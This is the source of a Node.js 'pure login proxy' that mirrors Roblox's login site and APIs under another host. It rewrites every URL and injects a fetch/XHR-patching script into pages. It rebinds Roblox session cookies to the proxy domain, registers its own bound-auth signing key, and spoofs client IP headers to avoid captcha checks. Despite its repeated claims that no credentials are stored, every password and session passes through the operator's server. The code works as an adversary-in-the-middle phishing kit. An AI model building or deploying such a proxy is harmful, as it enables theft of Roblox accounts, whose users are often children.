const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const { webcrypto } = require('crypto');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - NO CREDENTIALS STORED');
console.log('All login data passes directly to Roblox servers');
console.log('='.repeat(60));

// ---------------------------------------------------------------------------
// HBA (Hardware Backed Authentication)
// This generates cryptographic tokens for Roblox auth - NOT for storing passwords
// ---------------------------------------------------------------------------
let hbaKeyPair = null;
let hbaRegistrationAttempted = false;

async function generateAndRegisterHBAKey(csrfToken, cookie) {
    console.log('[HBA] Generating security token (no credentials stored)');
    
    const keyPair = await webcrypto.subtle.generateKey(
        { name: 'ECDSA', namedCurve: 'P-256' },
        true,
        ['sign', 'verify']
    );
    const publicKeyBuffer = await webcrypto.subtle.exportKey('spki', keyPair.publicKey);
    const publicKeyBase64 = Buffer.from(publicKeyBuffer).toString('base64');

    const res = await fetch('https://auth.roblox.com/rotating-client-service/v1/register', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'x-csrf-token': csrfToken,
            'Cookie': cookie,
        },
        body: JSON.stringify({ publicKey: publicKeyBase64 }),
    });

    const data = await res.json();
    console.log('[HBA] Register response:', res.status, JSON.stringify(data));

    if (res.ok && data.identifier) {
        hbaKeyPair = { privateKey: keyPair.privateKey, identifier: data.identifier };
        console.log('[HBA] ✅ Security token registered:', data.identifier);
    } else {
        console.log('[HBA] ⚠️ Registration failed - will proceed without HBA token');
        hbaKeyPair = null;
    }
}

async function generateBoundAuthToken(url, method, body) {
    if (!hbaKeyPair) return null;
    
    const encoder = new TextEncoder();
    const timestamp = Math.floor(Date.now() / 1000).toString();
    const bodyStr = typeof body === 'string' ? body : '';

    const hashBuffer = await webcrypto.subtle.digest('SHA-256', encoder.encode(bodyStr));
    const bodyHash = Buffer.from(hashBuffer).toString('base64');

    const urlObj = new URL(url);
    const pathname = urlObj.pathname;

    const p = [bodyHash, timestamp, url, method.toUpperCase()].join('|');
    const h = ['', timestamp, pathname, method.toUpperCase()].join('|');

    const sigP = await webcrypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, hbaKeyPair.privateKey, encoder.encode(p));
    const sigH = await webcrypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, hbaKeyPair.privateKey, encoder.encode(h));

    return `v1|${bodyHash}|${timestamp}|${Buffer.from(sigP).toString('base64')}|${Buffer.from(sigH).toString('base64')}`;
}

// ---------------------------------------------------------------------------
// Domain map — proxy prefix -> Roblox target
// ---------------------------------------------------------------------------
const SUBDOMAIN_MAP = {
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    // CDN
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
};

const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', 'rbxcdn', 'content-cdn']);

// ---------------------------------------------------------------------------
// Browser-side fetch/XHR interceptor injected into every HTML page.
// This catches URLs that are dynamically constructed at runtime (e.g. from
// data-domain="roblox.com" read by EnvironmentUrls.js).
// ---------------------------------------------------------------------------
function buildInjectedScript(host) {
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${host}/${prefix}`)}]`)
        .join(',\n');

    return `<script>
// 🔒 PURE LOGIN PROXY - Credentials pass directly to Roblox, never stored here
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
    var DOMAIN_MAP = [
        ${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com",  PROXY_HOST],
        ["https://roblox.com",     PROXY_HOST],
        ["http://roblox.com",      PROXY_HOST]
    ];

    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < DOMAIN_MAP.length; i++) {
            var from = DOMAIN_MAP[i][0];
            var to   = DOMAIN_MAP[i][1];
            if (url.indexOf(from) === 0) {
                return to + url.slice(from.length);
            }
        }
        return url;
    }

    // --- Patch fetch ---
    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        if (typeof resource === 'string') resource = rewriteUrl(resource);
        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
        return _fetch.call(this, resource, init);
    };

    // --- Patch XHR ---
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        return _open.apply(this, args);
    };

    // --- Patch window.location setter (prevents redirect away from proxy) ---
    try {
        var _assign = window.location.assign.bind(window.location);
        window.location.assign = function(url) { _assign(rewriteUrl(url)); };
    } catch(e) {}
})();
</script>`;
}

// ---------------------------------------------------------------------------
// URL rewriting for server-side responses (static references)
// ---------------------------------------------------------------------------
function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    let result = body;
    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
    }
    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
    return result;
}

// ---------------------------------------------------------------------------
// Request logging (shows credentials are NOT being stored)
// ---------------------------------------------------------------------------
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${req.method} ${req.path}`);
    next();
});

// ---------------------------------------------------------------------------
// Auth proxy — read body, generate HBA token, inject it
// IMPORTANT: This does NOT store credentials, only forwards them to Roblox
// ---------------------------------------------------------------------------
app.use('/auth-api', express.raw({ type: '*/*', limit: '10mb' }), async (req, res, next) => {
    const csrfToken = req.headers['x-csrf-token'];
    const cookie = req.headers['cookie'];

    console.log(`[AUTH] ${req.method} ${req.path} | csrf=${!!csrfToken} | cookie=${!!cookie} | bodyLen=${req.body ? req.body.length : 0}`);

    // Special logging for login attempts (to show we're NOT storing credentials)
    if (req.path === '/v2/login') {
        console.log('🔑 LOGIN ATTEMPT DETECTED');
        console.log('   → Credentials being forwarded to Roblox (NOT stored on proxy)');
        console.log('   → Body size:', req.body ? req.body.length : 0, 'bytes');
    }

    // Only require csrf token — login requests don't send Roblox cookies
    // because cookies are scoped to roblox.com, not our proxy domain
    if (req.method === 'POST' && csrfToken) {
        try {
            if (!hbaKeyPair && !hbaRegistrationAttempted) {
                hbaRegistrationAttempted = true;
                console.log('[HBA] Registering new security key...');
                await generateAndRegisterHBAKey(csrfToken, cookie || '');
            }
            if (hbaKeyPair) {
                const bodyStr = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : '';
                const targetUrl = `https://auth.roblox.com${req.path}`;
                req.hbaToken = await generateBoundAuthToken(targetUrl, req.method, bodyStr);
                console.log('[HBA] Security token generated for', req.path);
            }
        } catch (err) {
            console.error('[HBA] Error:', err.message);
        }
    }
    next();
});

app.use('/auth-api', createProxyMiddleware({
    target: 'https://auth.roblox.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: '',
    pathRewrite: { '^/auth-api': '' },
    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            
            // Forward the user's real IP so Roblox scores the login against a residential IP,
            // not the server's datacenter IP which triggers harder Arkose captcha
            const realIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
            if (realIp) {
                proxyReq.setHeader('x-forwarded-for', realIp);
                console.log('[AUTH] Forwarding real IP:', realIp);
            }
            
            if (req.hbaToken) {
                proxyReq.setHeader('x-bound-auth-token', req.hbaToken);
                console.log('[HBA] ✅ Attached security token to', req.path);
            }
            
            if (Buffer.isBuffer(req.body) && req.body.length > 0) {
                proxyReq.setHeader('content-length', req.body.length);
                proxyReq.write(req.body);
                proxyReq.end();
            }
        },
        proxyRes: (proxyRes, req) => {
            if (req.path === '/v2/login') {
                console.log(`[AUTH] ✅ Login response from Roblox: ${proxyRes.statusCode}`);
                if (proxyRes.statusCode === 200) {
                    console.log('   🎉 LOGIN SUCCESSFUL - User authenticated with Roblox');
                } else if (proxyRes.statusCode === 403) {
                    console.log('   ❌ Login failed - Invalid credentials or challenge required');
                } else {
                    console.log('   ⚠️ Unexpected response:', proxyRes.statusCode);
                }
            }
        },
        error: (err, req, res) => {
            console.error('[auth-api] ❌ Proxy error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// ---------------------------------------------------------------------------
// Challenge endpoint — intercept response for debugging
// ---------------------------------------------------------------------------
app.use('/apis-api/challenge', createProxyMiddleware({
    target: 'https://apis.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    cookieDomainRewrite: '',
    pathRewrite: { '^/': '/challenge/' },
    on: {
        proxyReq: (proxyReq) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
            proxyReq.setHeader('accept-encoding', 'gzip, deflate');
        },
        proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
            const body = responseBuffer.toString('utf8');
            console.log(`[CHALLENGE] ${req.method} ${req.path} → ${proxyRes.statusCode}`);
            console.log(`[CHALLENGE] Response: ${body.slice(0, 600)}`);
            return responseBuffer;
        }),
        error: (err, req, res) => {
            console.error('[challenge] ❌ Proxy error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// ---------------------------------------------------------------------------
// CDN + API subdomain proxies
// ---------------------------------------------------------------------------
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    if (prefix === 'auth-api') continue;
    const needsRewrite = CDN_PREFIXES.has(prefix);
    app.use(`/${prefix}`, createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        selfHandleResponse: needsRewrite,
        cookieDomainRewrite: '',
        pathRewrite: { [`^/${prefix}`]: '' },
        on: {
            proxyReq: (proxyReq) => {
                proxyReq.setHeader('origin', 'https://www.roblox.com');
                proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                if (needsRewrite) proxyReq.setHeader('accept-encoding', 'gzip, deflate');
            },
            ...(needsRewrite ? {
                proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req) => {
                    const ct = proxyRes.headers['content-type'] || '';
                    if (ct.includes('javascript') || ct.includes('application/json')) {
                        const host = req.headers.host;
                        const original = responseBuffer.toString('utf8');
                        const rewritten = rewriteUrls(original, host);
                        if (original !== rewritten) console.log(`[CDN-REWRITE] ${prefix}${req.path}`);
                        return rewritten;
                    }
                    return responseBuffer;
                })
            } : {}),
            error: (err, req, res) => {
                console.error(`[${prefix}] ❌ Proxy error:`, err.message);
                res.status(502).send('Proxy error');
            }
        }
    }));
}

// ---------------------------------------------------------------------------
// Main www.roblox.com proxy — inject interceptor script into HTML
// ---------------------------------------------------------------------------
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    cookieDomainRewrite: '',
    pathRewrite: (path) => (path === '/' || path === '') ? '/login' : path,
    on: {
        proxyReq: (proxyReq) => {
            proxyReq.setHeader('accept-encoding', 'gzip, deflate');
        },
        proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
            // Disable caching so browser always gets freshly rewritten content
            res.setHeader('cache-control', 'no-store, no-cache, must-revalidate');
            res.setHeader('pragma', 'no-cache');

            const ct = proxyRes.headers['content-type'] || '';
            if (ct.includes('text/html') || ct.includes('javascript') || ct.includes('application/json')) {
                const host = req.headers.host;
                let body = responseBuffer.toString('utf8');
                body = rewriteUrls(body, host);

                // Inject the fetch/XHR interceptor into HTML pages
                if (ct.includes('text/html')) {
                    const script = buildInjectedScript(host);
                    body = body.replace('<head', `<head>${script}`);
                    if (!body.includes(script)) {
                        body = script + body;
                    }
                    console.log(`[REWRITE] ✅ Injected client-side URL interceptor`);
                }

                console.log(`[REWRITE] ${req.path} | ${ct.split(';')[0]}`);
                return body;
            }
            return responseBuffer;
        }),
        error: (err, req, res) => {
            console.error('[main] ❌ Proxy error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('='.repeat(60));
    console.log(`✅ Roblox Pure Login Proxy running on port ${PORT}`);
    console.log(`🌐 Visit: http://localhost:${PORT}`);
    console.log('');
    console.log('🔒 SECURITY GUARANTEE:');
    console.log('   • Credentials are NEVER stored on this server');
    console.log('   • All login data passes directly to Roblox');
    console.log('   • HBA tokens are for security, not credential storage');
    console.log('   • Cookies are forwarded transparently');
    console.log('='.repeat(60));
    console.log('');
});
